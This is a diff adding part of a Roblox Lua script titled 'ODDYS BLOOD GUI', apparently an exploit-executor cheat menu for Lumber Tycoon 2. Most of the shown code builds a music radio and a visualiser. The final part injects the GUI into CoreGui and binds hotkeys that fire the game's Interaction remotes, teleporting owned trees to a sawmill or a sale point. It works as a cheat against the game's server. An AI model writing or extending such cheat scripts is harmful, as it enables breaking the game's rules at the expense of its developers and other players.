+	"Coldplay - Adventure Of A Lifetime",
+	"Cheat Codes - No Promises ft. Demi Lovato",
+	"Marshmello - Alone",
+	"Post Malone - Better Now",
+	"Post Malone - Paranoid",
+	"Post Malone - Psycho",
+	"Post Malone - White Iverson",
+	"Imagine Dragons - Thunder",
+	"Imagine Dragons - Radioactive",
+	"Sick Luke x Yzomandias - World Wide Way",
+	"Transformers 2 (The Game)",
+	"YZOMANDIAS - Nevzlátejte",
+	"YBN Nahmir - Rubbin Off The Paint",
+	"Global Dan - Off White",
+	"Famous Dex - Swagg [Bass Boosted]",
+	"Aero Chord feat- DDARK - Shootin Stars",
+	"Ahrix - Evolving",
+	"Alan Walker - Alone [Full]",
+	"Audioscribe - Free Fall [Full]",
+	"Cartoon - On & On",
+	"Cartoon - Why We Lose [FULL]",
+	"Culture Code & SirensCeol - Code of the Siren",
+	"DEAF KEV - Invincible ### Release",
+	"Desmeon - Hellcat FULL",
+	"Diamond Eyes - Everything [NCS Release]",
+	"Diamond Eyes - Flutter [NCS Release]",
+	"Different Heaven - Nekozilla",
+	"Disfigure - Blank [FULL]",
+	"Distrion & Alex Skrindo - Entropy",
+	"Diviners feat. Contacreast - Tropic Love",
+	"Diviners-Savanah (NCS) [FULL SONG]",
+	"Electro Light - Symbolism ~FULL~",
+	"Elektronomia - Heaven",
+	"Elektronomia - Limitless [Full]",
+	"Elektronomia - Sky High",
+	"Itro & Tobu - Cloud 9 FULL",
+	"Janji - Heroes Tonight",
+	"JJD - Adventure Full Audio",
+	"Jim Yosef & Anna Yvette - Linked",
+	"Jim Yosef - Arrow [NCS Release] FULL SONG",
+	"K-391 - Earth",
+	"Laszlo - Fall to Light Full",
+	"Lensko - Circles [NCS Release]",
+	"My Heart - Different Heaven & EH!DE [NCS]",
+	"[FULL Version] Paul F. Savag [NCS Realease]",
+	"Pegboard Nerds - Pink Cloud [Full]",
+	"Razihel - Lxove U",
+	"RetroVision - Puzzle [NCS Release]",
+	"Spektrem - Shine",
+	"Syn Cole - Feel Good",
+	"Tobu - Candyland [FULL]",
+	"Tobu - Infectious FULL",
+	"Unknown Brain - Superhero (feat. Chris Linton)",
+	"Vanze Forever (feat. Brent)",
+	"[FULL] Whales & ggnoaa - Paranoia [NCS Release]",
+	"[NCM] Lost Sky - Dreams",
+}
+
+
+
+--Parent
+
+vslz.Parent = RadioFrame
+fr2tl2.Parent = RadioFrame
+fr2tb1.Parent = RadioFrame
+scrf.Parent = RadioFrame
+fr3tl2tb1.Parent  = RadioFrame
+fr3tl3tb1.Parent  = RadioFrame
+fr3tl3.Parent  = RadioFrame
+
+--create preset music tabs
+
+for i=1,#musicnames do
+	local sbc = Instance.new("TextButton",scrf)
+	sbc.Name = i
+	sbc.Size = UDim2.new(1, 0,0, 25)
+	sbc.Position = UDim2.new(0, 0, 0, (i*25)-25)
+	sbc.BorderSizePixel = 0
+	sbc.BackgroundColor3 = clr(143, 121, 32)
+	sbc.Font = "SourceSansBold"
+	sbc.FontSize = "Size12"
+	sbc.TextColor3 = textcolor
+	sbc.TextWrapped = true
+	sbc.Text = musicnames[i]
+	sbc.AutoButtonColor = false
+	if (i % 2 == 0) then
+		sbc.BackgroundTransparency = 1
+	else
+		sbc.BackgroundTransparency = 1
+	end
+	sbc.MouseButton1Click:connect(function()
+		sound.SoundId = "rbxassetid://"..music[i]
+		sound:Play()
+		fr2tl2.Text = ""..musicnames[i]
+                                           
+	end)
+end
+
+--backgroundcolor3
+
+fr2tb1.BackgroundColor3 = clr(236, 240, 241)
+fr2tl2.BackgroundColor3 = clr(200, 167, 0)
+fr3tl2tb1.BackgroundColor3 = clr(236, 240, 241)
+fr3tl3.BackgroundColor3 = clr(255, 255, 255)
+fr3tl3tb1.BackgroundColor3 = Color3.fromRGB(249, 233, 153)
+scrf.BackgroundColor3 = clr(177, 134, 4)
+vslz.BackgroundColor3 = clr(177, 134, 4)
+
+--backgroundtransparency
+
+fr2tb1.BackgroundTransparency = 1
+fr2tl2.BackgroundTransparency = 1
+fr3tl2tb1.BackgroundTransparency = 1
+fr3tl3.BackgroundTransparency = 1
+fr3tl3tb1.BackgroundTransparency = 0
+scrf.BackgroundTransparency = 1
+vslz.BackgroundTransparency = 1
+
+--bordersizepixel
+
+fr2tb1.BorderSizePixel = 0
+fr2tl2.BorderSizePixel = 0
+fr3tl2tb1.BorderSizePixel = 0
+fr3tl3.BorderSizePixel = 0
+fr3tl3tb1.BorderSizePixel = 0
+scrf.BorderSizePixel = 0
+vslz.BorderSizePixel = 0
+
+--position
+
+fr2tb1.Position = UDim2.new(0, 40, 0, 173)
+fr2tl2.Position = UDim2.new(0, 23,0, 13)
+fr3tl2tb1.Position = UDim2.new(0, 35, 0, 145)
+fr3tl3.Position = UDim2.new(0, 91, 0, 142)
+fr3tl3tb1.Position = UDim2.new(0, 95, 0, 125)
+scrf.Position = UDim2.new(0, -10, 0, 195)
+vslz.Position = UDim2.new(0, 36,0, 16)
+
+--size
+
+fr2tb1.Size = UDim2.new(0, 125,0, 20)
+fr2tl2.Size = UDim2.new(0, 155, 0, 32)
+fr3tl2tb1.Size = UDim2.new(0, 15,0, 15)
+fr3tl3.Size = UDim2.new(0, 35, 0, 12)
+fr3tl3tb1.Size = UDim2.new(0, 15,0, 15)
+scrf.Size = UDim2.new(0, 220,1, -10)
+scrf.CanvasSize = UDim2.new(0, 0, 0, 2000)
+scrf.ScrollBarThickness = 4
+vslz.Size = UDim2.new(0, 150, 0, 75)
+
+--text
+
+fr3tl3.Text = "01-10"
+fr3tl2tb1.Text = ""
+fr3tl3tb1.Text = ""
+fr2tb1.Text = "Music ID"
+fr2tl2.Text = "Nothing is playing"
+
+--textcolor
+
+fr3tl3.TextColor3 = Color3.fromRGB(249, 233, 153)
+fr3tl2tb1.TextColor3 = textcolor
+fr3tl3tb1.TextColor3 = textcolor2
+fr2tb1.TextColor3 = Color3.fromRGB(249, 233, 153)
+fr2tl2.TextColor3 = Color3.fromRGB(249, 233, 153)
+
+--fontsize
+
+fr3tl3.FontSize = "Size12"
+fr3tl2tb1.FontSize = "Size14"
+fr3tl3tb1.FontSize = "Size14"
+fr2tb1.FontSize = "Size14"
+fr2tl2.FontSize = "Size14"
+
+--font
+
+fr3tl3.Font = "SourceSansLight"
+fr3tl2tb1.Font = "SourceSans"
+fr3tl3tb1.Font = "SourceSans"
+fr2tb1.Font = "SourceSans"
+fr2tl2.Font = "SourceSansItalic"
+fr3tl3.TextXAlignment = "Left"
+fr2tl2.TextWrapped = true
+
+
+fr3tl2tb1.MouseButton1Click:connect(function()
+	if not looped then
+		looped = true
+		sound.Looped = true
+                                           fr2tb1.Text = "Loop On"
+		fr3tl2tb1.BackgroundColor3 = clr(178, 180, 181)
+	else
+		looped = false
+		sound.Looped = false
+                                           fr2tb1.Text = "Loop Off"
+		fr3tl2tb1.BackgroundColor3 = clr(236, 240, 241)
+	end
+end)
+
+fr3tl3tb1.FocusLost:connect(function()
+	if tonumber(fr3tl3tb1.Text) < 11 and tonumber(fr3tl3tb1.Text) >= 0.1 then
+		sound.Volume = fr3tl3tb1.Text
+		fr3tl3tb1.Text = ""
+	end
+end)
+
+fr2tb1.FocusLost:connect(function()
+	local custom = game:GetService("MarketplaceService"):GetProductInfo(fr2tb1.Text)
+	if custom.AssetTypeId == 3 then
+		fr2tl2.Text = ""..custom.Name
+		sound.SoundId = "rbxassetid://"..fr2tb1.Text
+		sound:Play()
+	else
+		fr2tl2.Text = "Invalid ID: "..fr2tb1.Text
+	end
+	
+end)
+
+Stop.MouseButton1Click:connect(function()
+	for i, v in next,vslz:GetChildren() do
+		v:TweenSize(UDim2.new(0, 2, 0, 1), "Out", "Quad", .2, true)
+	end
+	sound.SoundId = 0
+	fr2tl2.Text = "Nothing is playing."
+end)
+
+
+for a=1,39 do
+	local vsb = Instance.new("Frame",vslz)
+	vsb.Name = "vsb"..a-1
+	vsb.Size = UDim2.new(0,2,0,1)
+	vsb.Position = UDim2.new(0,(a*3)-1,1,0)
+	vsb.BackgroundColor3 = clr(255, 255, 255)
+	vsb.BackgroundTransparency = 0.6
+	vsb.BorderSizePixel = 0
+	vsb.AnchorPoint = Vector2.new(0,1)
+end
+
+local Bars = {}
+
+for i,v in next,vslz:GetChildren() do
+	table.insert(Bars, v)
+end
+
+Height = 74
+
+
+local nBars,Tweens=#Bars-1,{}
+
+local function quadIn(t,b,c,d) t=t/d; return c*t*t+b; end;
+local function quadOut(t,b,c,d) t=t/d; return -c*t*(t-2)+b; end;
+local function Quad(obj,val,ease,d)
+	local t,f,con,nt,st,sd=tick()
+	Tweens[obj]=t -- Set identifier
+	st=obj.Size.Y.Offset -- Start Value
+	sd=val-st -- Change in Value
+	f=ease=='In' and quadIn or quadOut -- Choose between Out/In
+	con=game:GetService'RunService'.RenderStepped:connect(function() nt=tick()-t
+		if Tweens[obj]~=t then -- Check for override
+			con:disconnect()
+			return
+		end
+		local nv=math.max(.2,f(math.min(d,nt),st,sd,d)) -- New Value
+		obj.Size=UDim2.new(0, 2, 0, nv)
+		if nt>d then -- Easing done?
+			con:disconnect()
+			if ease~='In' then
+				Quad(obj,.2,'In',.3) -- Drop the bar
+			end
+		end
+	end)
+end
+
+local function CheckSet(N,S,D) -- Number, Scale, Direction
+	local nS=vslz["vsb"..tostring(N)].Size.Y.Offset
+	if S>nS then
+		Set(N,nS+(S-nS)/3,D)
+	end
+end
+
+function Set(N,S,D) -- Number, Scale, Direction
+	Quad(vslz["vsb"..tostring(N)],S,'Out',.1)
+	if N>0 and D~=1 then -- Checks left for smaller bars to manipulate
+		CheckSet(N-1,S,-1)
+	end
+	if N<nBars and D~=-1 then -- Checks right...
+		CheckSet(N+1,S,1)
+	end
+end
+
+-- RENDER LOOP --
+local MPL,PL,curr=0 curr=sound.SoundId
+game:service'RunService'.RenderStepped:connect(function()
+	PL=sound.PlaybackLoudness
+	if sound.IsPlaying and PL==PL then -- Sound is playing & PlaybackLoudness is not undefined
+		if curr~=sound.SoundId then MPL=0 -- Reset the relative Max PlaybackLoudness on song change
+			curr=sound.SoundId
+		end
+		MPL=math.max(PL,MPL) PL=PL/MPL -- Normalize PL based on relative Max PlaybackLoudness
+		if PL==PL then
+			Set(math.floor(PL*nBars),PL*Height) -- Modify bar relative to PlaybackLoudness
+		end
+	end
+end)
+
+
+local Menus = {
+[Player] = PlayerFrame;
+[TeleportA] = Waypoints;
+[AIntroImage] = BloodFrameInfo;
+[Woodmenu] = WoodFrame;
+[Copymenu] = CopyFrame;
+[PaintFill] = PaintFills;
+[Artmenu] = ArtFrame;
+[toolamenu] = toolaFrame;
+[Buymenu] = BuyFrame;
+[Radio] = RadioFrame;
+[Btoolamenu] = LT2GUI2Frame;
+[wrus] = Woodrus;
+[fshop] = Furniture1;
+[bcps] = BobsCarPics;
+[ls] = LogicStore;
+[bp] = BluePrint1;
+}
+for button,frame in pairs(Menus) do
+	button.MouseButton1Click:connect(function()
+		if frame.Visible then
+			frame.Visible = false
+			return
+		end
+		for k,v in pairs(Menus) do
+			v.Visible = v == frame
+		end
+	end)
+end
+
+
+--- Open/Close ---
+
+function makesound(id)
+local s=Instance.new("Sound",BLOOD)
+s.SoundId=id
+s.Volume=5
+s.PlaybackSpeed=1
+s:Play()
+end
+
+Open.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+	MainFrame:TweenPosition(UDim2.new(1, -500, 0.7, -410), "Out", "Back",2.5)
+	OpenFrame.Visible = true
+	MainFrame.Visible = true
+end)
+
+Minimize.MouseButton1Click:connect(function()
+  makesound("rbxassetid://156785206")
+	MainFrame:TweenPosition(UDim2.new(0.5, -40, 0, -28), "In", "Back",2.5)
+	wait(2.5)
+    MainFrame.Visible = false
+    OpenFrame.Visible = true
+end)
+
+CloseBLOOD.MouseButton1Down:connect(function()
+  makesound("rbxassetid://156785206")
+	MainFrame:TweenPosition(UDim2.new(0.5, -40, 0, -28), "In", "Back",2.5)
+	wait(2.5)
+	game:GetService("StarterGui"):SetCore("SendNotification",{
+Title = "ODDYS BLOOD GUI",
+Text = "Thanks for using!",
+Duration = 6,
+	})
+BLOOD:destroy()
+VBlood:destroy()
+end)
+
+--bring up menu
+CurrentItem.MouseButton1Click:Connect(function()
+if Picker.Visible == false then
+Picker.Visible = true
+else
+Picker.Visible = false
+end
+end)
+
+VBlood.Name = 'VBlood'
+VBlood.Parent = game.CoreGui
+
+TitleVersion.Name = 'TitleVersion'
+TitleVersion.Parent = VBlood
+TitleVersion.BackgroundColor3 = Color3.new(1, 1, 1)
+TitleVersion.BackgroundTransparency = 1
+TitleVersion.Position = UDim2.new(0, 10, 0, 10)
+TitleVersion.Size = UDim2.new(0, 330, 0, 200100)
+	
+
+Title.Name = 'Title'
+Title.Parent = TitleVersion
+Title.BackgroundColor3 = Color3.new(1, 1, 1)
+Title.BackgroundTransparency = 1
+Title.Position = UDim2.new(0, -611, 0, 611)
+Title.Size = UDim2.new(0, 288, 0, 34)
+Title.Font = Enum.Font.Fantasy
+Title.Text = 'BLOOD'
+Title.TextColor3 = Color3.new(255, 0, 0)
+Title.TextSize = 30
+Title.TextWrapped = true
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title:TweenPosition(UDim2.new(0, 11, 0, 611), "In", "Back",2.5)
+
+Version.Name = 'Version'
+Version.Parent = TitleVersion
+Version.BackgroundColor3 = Color3.new(1, 1, 1)
+Version.BackgroundTransparency = 1
+Version.Position = UDim2.new(0, 611, 0, -645)
+Version.Size = UDim2.new(0, 146, 0, 22)
+Version.Font = Enum.Font.Fantasy
+Version.Text = 'Version 3'
+Version.TextColor3 = Color3.new(1, 1, 1)
+Version.TextSize = 17
+Version.TextWrapped = true
+Version.TextXAlignment = Enum.TextXAlignment.Left
+Version:TweenPosition(UDim2.new(0, 11, 0, 645), "In", "Back",2.5)
+
+Option = false
+BTool = "Nothing"
+WCollide = "Nothing"
+LT2Info = "Nothing"
+GreyStart = "Nothing"
+MDown = false
+afkactive = false
+CustomLocationSet = false
+
+
+-- Wood Teleports
+
+sawmillkey = "q"
+tptosawmillkey = "e"
+sellkey = "r"
+
+SetSawmillKey.MouseButton1Click:Connect(function()
+	sawmillkey = SetSawBox.Text
+end)
+
+SetSawTPKey.MouseButton1Click:Connect(function()
+	tptosawmillkey = SawTPBox.Text
+end)
+
+SetSellTPKey.MouseButton1Click:Connect(function()
+	sellkey = SellWoodBox.Text
+end)
+
+Mouse = game.Players.LocalPlayer:GetMouse()
+
+Treee = nil
+
+Mouse.KeyDown:connect(function(key)
+    if key:lower() == tptosawmillkey then
+        Treee = Mouse.Target
+    end
+    if Treee ~= nil then
+        Mod(Treee)
+    end
+end)
+
+Mouse.KeyDown:connect(function(key)
+    if key:lower() == sawmillkey then
+        if Mouse.Target.Parent:FindFirstChild("BlockageAlert") then
+            Sawmill = Mouse.Target.Parent 
+        else 
+            Sawmill = Mouse.Target.Parent.Parent
+        end
+        if Sawmill:FindFirstChild("BlockageAlert") and Sawmill:FindFirstChild("Owner") then
+            SawmillC = true
+            SawmillSetTitle.Text = "Selected"
+            SawmillSetTitle.TextColor3 = Color3.new(0, 255, 0)
+        else
+            SawmillC = false
+            print"Something went wrong while setting the sawmill!"
+        end
+    end
+end)
+
+function Mod(SelectedPart)
+    if SawmillC ~= true then 
+        print'Set the sawmill with "P"!'
+        return
+    end
+    if SelectedPart.Parent:FindFirstChild("TreeClass") and SelectedPart.Parent:FindFirstChild("Owner") then
+        local Tree = SelectedPart.Parent
+        Tree.PrimaryPart = SelectedPart
+        game.ReplicatedStorage.Interaction.Verify:FireServer('Item owned by player',Tree)
+        Tree:SetPrimaryPartCFrame(Sawmill.Particles.CFrame)
+        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Tree)
+    end
+end
+
+Wood = nil
+
+Mouse.KeyDown:connect(function(key)
+	if key:lower() == sellkey then
+		Wood = Mouse.Target
+	end
+    if Wood ~= nil then
+        Move(Wood)
+    end
+end)
+
+function Move(SelectedPart)
+	if SelectedPart.Parent:FindFirstChild("TreeClass") and SelectedPart.Parent:FindFirstChild("Owner") then
+		local Tree = SelectedPart.Parent
+		Tree.PrimaryPart = SelectedPart
+		game.ReplicatedStorage.Interaction.Verify:FireServer('Item owned by player',Tree)
+		Tree:SetPrimaryPartCFrame(CFrame.new(330.3, -0.4, 91.3))
+		game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Tree)
+	end
+end
